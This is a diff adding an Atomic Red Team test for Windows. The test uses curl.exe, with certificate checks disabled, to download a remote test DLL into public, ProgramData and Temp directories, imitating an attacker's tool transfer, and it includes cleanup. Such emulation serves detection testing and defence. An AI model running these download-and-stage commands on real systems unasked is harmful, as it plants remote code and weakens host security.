@@ -440,3 +440,44 @@ atomic_tests:
       $file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)
       cmd.exe /c "del $file_to_be_removed"
     name: powershell
+
+- name: Curl Download File
+  auto_generated_guid: 2b080b99-0deb-4d51-af0f-833d37c4ca6a
+  description: |
+    The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.
+    Expected output will include whether the file downloaded successfully or not.
+  supported_platforms:
+  - windows
+  input_arguments:
+    file_download:
+      description: File to download
+      type: String
+      default: https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll
+    curl_path:
+      description: path to curl.exe
+      type: Path
+      default: C:\Windows\System32\Curl.exe
+  dependency_executor_name: powershell 
+  dependencies: 
+    - description: |
+        Curl must be installed on system.
+      prereq_command: |
+        if (Test-Path #{curl_path}) {exit 0} else {exit 1}
+      get_prereq_command: |
+        Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile $env:temp\curl.zip
+        Expand-Archive -Path $env:temp\curl.zip -DestinationPath $env:temp\curl
+        Copy-Item $env:temp\curl\curl-7.79.1-win64-mingw\bin\curl.exe C:\Windows\System32\Curl.exe
+        Remove-Item $env:temp\curl
+        Remove-Item $env:temp\curl.zip
+  executor:
+    command: |
+      #{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll
+      #{curl_path} -k #{file_download} --output c:\users\public\music\allthethingsx64.dll
+      #{curl_path} -k #{file_download} -o c:\programdata\allthethingsx64.dll
+      #{curl_path} -k #{file_download} -o %Temp%\allthethingsx64.dll
+    cleanup_command: |
+      del c:\users\public\music\allthethingsx64.dll >nul 2>&1
+      del c:\users\public\music\allthethingsx64.dll >nul 2>&1
+      del c:\programdata\allthethingsx64.dll >nul 2>&1
+      del %Temp%\allthethingsx64.dll >nul 2>&1
+    name: command_prompt
